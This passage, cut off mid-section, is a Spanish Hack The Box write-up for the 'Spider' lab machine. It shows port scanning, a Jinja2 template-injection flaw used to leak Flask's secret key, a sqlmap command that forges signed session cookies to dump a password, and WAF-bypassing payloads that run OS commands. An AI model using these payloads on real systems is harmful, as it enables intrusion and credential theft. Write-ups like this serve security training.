<!doctype html><html lang=es>
<head>
<title>Spider | 7Rocky</title>
<meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
<meta name=viewport content="width=device-width,minimum-scale=1">
<meta name=description content="Hack The Box. Linux. Máquina difícil. Esta máquina contiene una página web vulnerable a Server-Site Template Injection (SSTI) en dos puntos e inyección de código SQL (SQLi), y otra página interna vulnerable a inyección de entidades externas XML (XXE). Para comprometer esta máquina se necesitan conocimientos avanzados de SSTI y evasión de filtros, SQLi, XXE y reenvío de puertos. En este write-up se utiliza un script en Python para explotar un SSTI y un script en Bash para leer archivos mediante XXE">
<meta name=robots content="index, follow">
<meta name=image content="https://7rocky.github.io/images/HTB/Spider/Spider.png">
<meta name=author content="7Rocky">
<meta property="og:title" content="Spider">
<meta property="og:description" content="Hack The Box. Linux. Máquina difícil. Esta máquina contiene una página web vulnerable a Server-Site Template Injection (SSTI) en dos puntos e inyección de código SQL (SQLi), y otra página interna vulnerable a inyección de entidades externas XML (XXE). Para comprometer esta máquina se necesitan conocimientos avanzados de SSTI y evasión de filtros, SQLi, XXE y reenvío de puertos. En este write-up se utiliza un script en Python para explotar un SSTI y un script en Bash para leer archivos mediante XXE">
<meta property="og:type" content="article">
<meta property="og:url" content="https://7rocky.github.io/htb/spider/"><meta property="article:section" content="htb">
<meta property="article:published_time" content="2021-10-23T00:00:00+01:00">
<meta property="article:modified_time" content="2022-01-24T02:55:10+01:00"><meta property="og:site_name" content="7Rocky">
<meta property="og:image" content="https://7rocky.github.io/images/HTB/Spider/Spider.png">
<meta property="og:author" content="7Rocky">
<meta itemprop=name content="Spider">
<meta itemprop=description content="Hack The Box. Linux. Máquina difícil. Esta máquina contiene una página web vulnerable a Server-Site Template Injection (SSTI) en dos puntos e inyección de código SQL (SQLi), y otra página interna vulnerable a inyección de entidades externas XML (XXE). Para comprometer esta máquina se necesitan conocimientos avanzados de SSTI y evasión de filtros, SQLi, XXE y reenvío de puertos. En este write-up se utiliza un script en Python para explotar un SSTI y un script en Bash para leer archivos mediante XXE"><meta itemprop=datePublished content="2021-10-23T00:00:00+01:00">
<meta itemprop=dateModified content="2022-01-24T02:55:10+01:00">
<meta itemprop=wordCount content="1823">
<meta itemprop=keywords content="flask,port-forwarding,xxe,sqli,ssti,rce,">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="Spider">
<meta name=twitter:description content="Hack The Box. Linux. Máquina difícil. Esta máquina contiene una página web vulnerable a Server-Site Template Injection (SSTI) en dos puntos e inyección de código SQL (SQLi), y otra página interna vulnerable a inyección de entidades externas XML (XXE). Para comprometer esta máquina se necesitan conocimientos avanzados de SSTI y evasión de filtros, SQLi, XXE y reenvío de puertos. En este write-up se utiliza un script en Python para explotar un SSTI y un script en Bash para leer archivos mediante XXE">
<meta name=twitter:image content="https://7rocky.github.io/images/HTB/Spider/Spider.png">
<meta name=twitter:author content="7Rocky">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-Z1HQGH3M4D',{anonymize_ip:!1})}</script>
<link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon>
<link href=/css/style.css rel=stylesheet>
<link href=/css/monokai-sublime.min.css rel=stylesheet>
<link href=/css/code.css rel=stylesheet>
<link href=/css/main.css rel=stylesheet>
<script src=/js/highlight.min.js></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script>
<script src=//mozilla.github.io/pdf.js/build/pdf.js></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script>
<script src=/js/main.js></script>
<div style=display:none>
$
\newcommand{\e}{e}
\newcommand{\N}[1][]{\mathbb{N}^{#1}}
\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
\newcommand{\R}[1][]{\mathbb{R}^{#1}}
\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
\newcommand{\C}[1][]{\mathbb{C}^{#1}}
\newcommand{\dx}{\,\mathrm{d}x}
\newcommand{\dy}{\,\mathrm{d}y}
\newcommand{\dz}{\,\mathrm{d}z}
\newcommand{\dt}{\,\mathrm{d}t}
\newcommand{\divides}{\, | \,}
\newcommand{\st}{\; | \;}
\renewcommand{\geq}{\geqslant}
\renewcommand{\leq}{\leqslant}
\renewcommand{\i}{\mathrm{i}}
\newcommand{\rank}{\mathop{\mathrm{rank}}}
\newcommand{\tr}{\mathop{\mathrm{tr}}}
\newcommand{\charField}{\mathop{\mathrm{char}}}
\newcommand{\Image}{\mathop{\mathrm{Im}}}
$
</div>
</head>
<body class="ma0 production">
<header>
<div class=bg-black>
<nav class="pv3 ph3 ph4-ns" role=navigation>
<div class="flex-l justify-between items-center center">
<a class="f3 fw2 hover-white no-underline white-90 dib" href=/ title=7Rocky>7Rocky</a>
<div class="flex-l items-center">
<a class="link-transition github link dib z-999 pt3 pt0-l mr3" href=/en/htb/spider/ title=en>
<img alt=en height=32px src=/images/en.png width=32px>
</a>
<ul class="pl0 ml3 mr3">
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/ctf/ title=CTF>CTF</a>
</li>
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/htb/ title=HTB>HTB</a>
</li>
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/imc/ title=IMC>IMC</a>
</li>
</ul>
<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
</div>
</div>
</nav>
</div>
</header>
<main class=pb7 role=main>
<article class="flex-l flex-wrap justify-between mw8 center ph3">
<header class="mt4 w-100">
<aside aria-label=aside class="instapaper_ignoref b helvetica tracked">HTB</aside>
<div id=sharing class=mt3>
<a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/spider/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a>
<a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/spider/&text=Spider" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
<a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/spider/&title=Spider" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
</div>
<h1 class="f1 mt3 mb1">Spider</h1>
<time class="f6 mv4 dib tracked" datetime=2021-10-23T00:00:00+01:00>23 / 10 / 2021</time>
</header>
<div class=htb-image>
<img alt=Spider src=/images/HTB/Spider/Spider.png>
</div>
<ul class="nested-links tags">
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/flask title=Flask>Flask</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/port-forwarding title="Reenvío de puertos">Reenvío de puertos</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/xxe title="Entidad Externa XML">Entidad Externa XML</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/sqli title="Inyección de código SQL">Inyección de código SQL</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/ssti title="Server-Side Template Injection">Server-Side Template Injection</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/rce title="Ejecución remota de comandos">Ejecución remota de comandos</a>
</li>
</ul>
<aside aria-label=aside class="w-20-l mt6-l aside-mobile">
<div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:2rem>
<p class="f5 b mb3">Contenidos de este write-up</p>
<nav id=TableOfContents>
<ul>
<li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li>
<li><a href=#exploración-web>Exploración web</a></li>
<li><a href=#buscando-un-ssti>Buscando un SSTI</a></li>
<li><a href=#obtención-de-la-clave-secreta-de-flask>Obtención de la clave secreta de Flask</a></li>
<li><a href=#encontrando-una-inyección-de-código-sql>Encontrando una inyección de código SQL</a></li>
<li><a href=#explotando-un-ssti-rebuscado>Explotando un SSTI rebuscado</a></li>
<li><a href=#intrusión-en-la-máquina>Intrusión en la máquina</a></li>
<li><a href=#enumeración-del-sistema>Enumeración del sistema</a></li>
<li><a href=#encontrando-un-xxe>Encontrando un XXE</a></li>
<li><a href=#acceso-a-la-máquina-como-root>Acceso a la máquina como <code>root</code></a></li>
</ul>
</nav>
</div>
</aside>
<div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul>
<li>
<strong>SO</strong>: Linux
</li>
<li>
<strong>Dificultad</strong>: Difícil
</li>
<li>
<strong>Dirección IP</strong>: 10.10.10.243
</li>
<li>
<strong>Fecha</strong>: 29 / 05 / 2021
</li>
</ul>
<h2 id=escaneo-de-puertos>Escaneo de puertos</h2>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext># Nmap 7.92 scan initiated as: nmap -sC -sV -oN nmap/targeted 10.10.10.243 -p 22,80
Nmap scan report for 10.10.10.243
Host is up (0.034s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 28:f1:61:28:01:63:29:6d:c5:03:6d:a9:f0:b0:66:61 (RSA)
|   256 3a:15:8c:cc:66:f4:9d:cb:ed:8a:1f:f9:d7:ab:d1:cc (ECDSA)
|_  256 a6:d4:0c:8e:5b:aa:3f:93:74:d6:a8:08:c9:52:39:09 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://spider.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
# Nmap done -- 1 IP address (1 host up) scanned in 11.15 seconds
</code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).</p>
<h2 id=exploración-web>Exploración web</h2>
<p>Si entramos en <code>http://10.10.10.243</code>, el servidor redirige la petición a <code>http://spider.htb</code>. Esto significa que el servidor utiliza <em>virtual hosting</em>, por lo que necesitamos incluir el dominio <code>spider.htb</code> en el archivo <code>/etc/hosts</code>. Y ahora, podemos acceder a la página:</p>
<p><img src=../../../images/HTB/Spider/Spider-index.png alt="Página web de Spider"></p>
<p>Utilizando <code>gobuster</code> podemos encontrar algunas rutas del servidor:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ gobuster dir -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -q -u http://spider.htb 
/index                (Status: 200) [Size: 11273]
/login                (Status: 200) [Size: 1832]
/register             (Status: 200) [Size: 2130]
/main                 (Status: 302) [Size: 219] [--&gt; http://spider.htb/login]
/user                 (Status: 302) [Size: 219] [--&gt; http://spider.htb/login]
/view                 (Status: 302) [Size: 219] [--&gt; http://spider.htb/login]
/cart                 (Status: 500) [Size: 290]
/logout               (Status: 302) [Size: 209] [--&gt; http://spider.htb/]
/checkout             (Status: 500) [Size: 290]
</code></pre></div><p>Después de inspeccionar la página, podemos ver que está utilizando Flask (un <em>framework</em> para desarrollo <em>back-end</em> con Python), ya que el estado de la respuesta HTTP está en mayúsculas (por ejemplo: OK, FOUND, NOT FOUND, INTERNAL SERVER ERROR&mldr;), lo cual es común en Flask:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ curl -I spider.htb/asdf
HTTP/1.1 404 NOT FOUND
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 23 Oct 2021 10:24:58 GMT
Content-Type: text/html; charset=utf-8 
Content-Length: 232
Connection: keep-alive
</code></pre></div><h2 id=buscando-un-ssti>Buscando un SSTI</h2>
<p>Flask utiliza un motor de plantillas llamado Jinja2, que puede ser vulnerable a <em>Server-Side Template Injection</em> (SSTI) si el servidor está mal configurado.</p>
<p>Existe una <a href=https://twitter.com/SecGus>cuenta de Twitter</a> que aparece en la página web de un investigador de Ciberseguridad que escribió un <a href=https://gusralph.info/jinja2-ssti-research/>artículo sobre SSTI en Flask con Jinja2</a>. Esto se trata de una pista. De hecho, hay más <em>easter eggs</em> relacionados con este artículo.</p>
<p>Después de probar en varios campos de formularios, se descubre que la vulnerabilidad de SSTI está en el campo de usuario al registrar una nueva cuenta. Después de registrarse, al acceder a los datos del perfil, el contenido inyectado se muestra ejecutado. Esto se ilustra en las siguientes imágenes:</p>
<p><img src=../../../images/HTB/Spider/Spider-register.png alt="Registro de usuario con SSTI"></p>
<p><img src=../../../images/HTB/Spider/Spider-user-ssti.png alt="Ejecución de SSTI"></p>
<p>A continuación, podemos escribir un <em>script</em> en Python llamado <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Spider/ssti.py><code>ssti.py</code></a> para automatizar el proceso de crear una cuenta con SSTI y acceder al perfil para ver el resultado (explicación detallada <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Spider#sstipy>aquí</a>).</p>
<p>Por ejemplo, como prueba de concepto:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ python3 ssti.py <span style=color:#e6db74>&#39;{{7*7}}&#39;</span> 
49
</code></pre></div><h2 id=obtención-de-la-clave-secreta-de-flask>Obtención de la clave secreta de Flask</h2>
<p>Es necesario tener en cuenta que el campo de usuario solo admite hasta 10 caracteres, por lo que no hay muchos <em>payloads</em> que sean útiles. Sin embargo, podemos obtener el contenido de la variable <code>config</code> de Flask:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ python3 ssti.py <span style=color:#e6db74>&#39;{{config}}&#39;</span>
&lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SECRET_KEY&#39;: &#39;Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942&#39;, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;/&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: False, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: datetime.timedelta(0, 43200), &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: True, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: False, &#39;JSONIFY_MIMETYPE&#39;: &#39;application/json&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093, &#39;RATELIMIT_ENABLED&#39;: True, &#39;RATELIMIT_DEFAULTS_PER_METHOD&#39;: False, &#39;RATELIMIT_SWALLOW_ERRORS&#39;: False, &#39;RATELIMIT_HEADERS_ENABLED&#39;: False, &#39;RATELIMIT_STORAGE_URL&#39;: &#39;memory://&#39;, &#39;RATELIMIT_STRATEGY&#39;: &#39;fixed-window&#39;, &#39;RATELIMIT_HEADER_RESET&#39;: &#39;X-RateLimit-Reset&#39;, &#39;RATELIMIT_HEADER_REMAINING&#39;: &#39;X-RateLimit-Remaining&#39;, &#39;RATELIMIT_HEADER_LIMIT&#39;: &#39;X-RateLimit-Limit&#39;, &#39;RATELIMIT_HEADER_RETRY_AFTER&#39;: &#39;Retry-After&#39;, &#39;UPLOAD_FOLDER&#39;: &#39;static/uploads&#39;}&gt; 
</code></pre></div><p>De aquí conseguimos la clave secreta que se utiliza para firmar las <em>cookies</em> de sesión. Entonces, está claro que necesitamos realizar alguna acción con las <em>cookies</em>.</p>
<h2 id=encontrando-una-inyección-de-código-sql>Encontrando una inyección de código SQL</h2>
<p>Después de investigar sobre las sesiones de Flask y las <em>cookies</em> que genera, encontramos una manera de inyectar código SQL en el contenido de la <em>cookie</em> utilizando <code>sqlmap</code> y el módulo <code>flask_unsign</code> de Python (puede instalarse con <code>pip</code>). Más información en <a href=https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap#eval>HackTricks</a>.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ sqlmap --url http://spider.htb/ --eval <span style=color:#e6db74>&#34;import flask_unsign; session = flask_unsign.session.sign({&#39;cart_items&#39;: [], &#39;uuid&#39;: session}, secret=&#39;Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942&#39;)&#34;</span> --cookie<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;session=*&#34;</span> --random-agent --dump 
...
+----+--------------------------------------+------------+-----------------+
| id | uuid                                 | name       | password        |
+----+--------------------------------------+------------+-----------------+
| 1  | 129f60ea-30cf-4065-afb9-6be45ad38b73 | chiv       | ch1VW4sHERE7331 |
+----+--------------------------------------+------------+-----------------+
</code></pre></div><p>Para que funcione el comando de <code>sqlmap</code> es importante decir &ldquo;No&rdquo; cuando pregunte por lo siguiente:</p>
<ul>
<li><em><code>you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n]</code></em></li>
<li><em><code>do you want to URL encode cookie values (implementation specific)? [Y/n]</code></em></li>
</ul>
<h2 id=explotando-un-ssti-rebuscado>Explotando un SSTI rebuscado</h2>
<p>Ahora que tenemos la contraseña del usuario <code>chiv</code> (esta es otra referencia al artículo de SSTI) podemos acceder al panel de administración en <code>http://spider.htb/admin</code>:</p>
<p><img src=../../../images/HTB/Spider/Spider-chiv-panel.png alt="Panel de administración de chiv"></p>
<p>Como usuario <code>chiv</code>, se tiene acceso a un panel de tickets en <code>http://spider.htb/view?check=support</code> y podemos añadir nuevos tickets desde <code>http://spider.htb/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal</code>. Esta URL se encuentra en un mensaje:</p>
<p><img src=../../../images/HTB/Spider/Spider-message.png alt="chiv admin panel message"></p>
<p>Podemos tratar de inyectar SSTI otra vez, pero esta vez hay un WAF que bloquea algunos caracteres. Entre los caracteres bloqueados, tenemos: <code>{{</code>, <code>}}</code>, <code>_</code>, <code>.</code>, <code>'</code>, <code>if</code>, <code>for</code>, <code>filter</code> y <code>block</code>.</p>
<p><img src=../../../images/HTB/Spider/Spider-ssti-filter-brackets.png alt="Blocking curly braces"></p>
<p><img src=../../../images/HTB/Spider/Spider-ssti-filters.png alt="Blocking special characters"></p>
<p>Existen varios <em>bypasses</em> en el artículo de SSTI, pero ninguno es totalmente adecuado.</p>
<p>Estamos forzados a utilizar el formato <code>{% code %}</code> para añadir un bloque de código válido en una plantilla. Pero con este formato, necesitamos añadir otra expresión. Estos bloques son usados principalmente con sentencias <code>if</code> y <code>for</code> de Python. Pero ambas palabras clave están bloqueadas.</p>
<p>En el artículo podemos ver el siguiente <em>payload</em>, que es útil porque coincide en parte con la situación que tenemos:</p>
<blockquote>
<p>If the waf blocks “.” and “_”:</p>
</blockquote>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-django data-lang=django><span style=color:#75715e>{{</span>request<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;application&#39;</span><span style=color:#f92672>][</span><span style=color:#e6db74>&#39;\x5f\x5fglobals\x5f\x5f&#39;</span><span style=color:#f92672>][</span><span style=color:#e6db74>&#39;\x5f\x5fbuiltins\x5f\x5f&#39;</span><span style=color:#f92672>][</span><span style=color:#e6db74>&#39;\x5f\x5fimport\x5f\x5f&#39;</span><span style=color:#f92672>](</span><span style=color:#e6db74>&#39;os&#39;</span><span style=color:#f92672>)[</span><span style=color:#e6db74>&#39;popen&#39;</span><span style=color:#f92672>](</span><span style=color:#e6db74>&#39;id&#39;</span><span style=color:#f92672>)[</span><span style=color:#e6db74>&#39;read&#39;</span><span style=color:#f92672>]()</span><span style=color:#75715e>}}</span> 
</code></pre></div><p>Existe otro <em>payload</em> para <em>bypassear</em> el filtro de <code>{{</code> y <code>}}</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-django data-lang=django><span style=color:#75715e>{%</span> <span style=color:#66d9ef>if</span> request<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;application&#39;</span><span style=color:#f92672>][</span><span style=color:#e6db74>&#39;__globals__&#39;</span><span style=color:#f92672>][</span><span style=color:#e6db74>&#39;__builtins__&#39;</span><span style=color:#f92672>][</span><span style=color:#e6db74>&#39;__import__&#39;</span><span style=color:#f92672>](</span><span style=color:#e6db74>&#39;os&#39;</span><span style=color:#f92672>)[</span><span style=color:#e6db74>&#39;popen&#39;</span><span style=color:#f92672>](</span><span style=color:#e6db74>&#39;whoami&#39;</span><span style=color:#f92672>)[</span><span style=color:#e6db74>&#39;read&#39;</span><span style=color:#f92672>]()</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;chiv\n&#39;</span> <span style=color:#75715e>%}</span> a <span style=color:#75715e>{%</span> <span style=color:#66d9ef>endif</span> <span style=color:#75715e>%}</span> 
</code></pre></div><p>Finalmente, existe una palabra clave de Python llamada <code>with</code> (que no está bloqueada) que se usa principalmente para abrir archivos (de forma que el archivo se cierra automáticamente al salir del bloque de código). Sin embargo, se puede utilizar también para abrir procesos. La idea entonces es ejecutar el siguiente código de Python (pero en <a href=https://jinja.palletsprojects.com/en/2.10.x/templates/#with-statement>formato Jinja2</a>):</p>
